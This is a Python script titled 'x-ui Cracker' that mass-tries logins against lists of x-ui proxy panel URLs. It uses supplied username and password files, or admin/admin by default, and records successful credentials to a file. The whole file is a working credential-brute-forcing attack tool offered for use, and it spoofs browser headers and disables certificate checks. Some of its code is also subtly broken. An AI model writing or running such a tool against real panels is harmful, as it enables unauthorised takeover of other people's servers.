import requests
import argparse
import urllib3
import json
from src import banners
from colorama import Fore


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def login(url, username, password, success_file):
    headers = {
        'Cookie': 'lang=en-US',
        'Sec-Ch-Ua': '"Chromium";v="121", "Not A(Brand";v="99"',
        'Accept': 'application/json, text/plain, */*',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Sec-Ch-Ua-Mobile': '?0',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36',
        'Sec-Ch-Ua-Platform': '"Windows"',
        'Origin': url,
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': url,
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'en-US,en;q=0.9',
        'Priority': 'u=1, i',
    }

    data = {
        'username': username,
        'password': password
    }

    response = requests.post(url, headers=headers, data=data, verify=False)

    # Validate the response
    if response.ok:
        response_data = response.json()
        if response_data['success']:
            print(f"{Fore.GREEN}Login successful! URL: {url}, Username: {username}, Password: {password}{Fore.RESET}")
            with open(success_file, 'a') as file:
                file.write(f"URL: {url}, Username: {username}, Password: {password}\n")
        else:
            print(f"{Fore.RED}Login failed for URL: {url} with username: {username}{Fore.RESET}")
    else:
        print(f"{Fore.RED}Error occurred for URL: {url} {response.text}{Fore.RESET}")


def load_credentials_from_file(file_path):
    with open(file_path, 'r') as file:
        return [line.strip().split(',') for line in file]


def load_urls_from_file(file_path):
    with open(file_path, 'r') as file:
        return file.readlines()


def main():
    banners()  # Call the banners function

    parser = argparse.ArgumentParser(
        prog='x-ui Cracker',
        description='Crack the x-ui panels. Use -h or --help to show this help message and exit.')
    parser.add_argument('-uf', '--userfile', help='Specify the file containing usernames')
    parser.add_argument('-pf', '--passfile', help='Specify the file containing passwords')
    parser.add_argument('-lf', '--listfile', help='Specify the file containing list of URLs')
    parser.add_argument('-sf', '--successfile', help='Specify the file to save successful attempts')

    args = parser.parse_args()

    if not args.listfile:
        parser.print_help()
        return

    if args.userfile and args.passfile:
        credentials = load_credentials_from_file(args.userfile)
        passwords = load_credentials_from_file(args.passfile)
        urls = load_urls_from_file(args.listfile)
        for url in urls:
            url = url.strip()
            for username, password in zip(credentials, passwords):
                login(url, username, password, args.successfile)
    else:
        urls = load_urls_from_file(args.listfile)
        for url in urls:
            login(url.strip(), 'admin', 'admin', args.successfile)  # Default credentials if files are not provided


if __name__ == "__main__":
    main()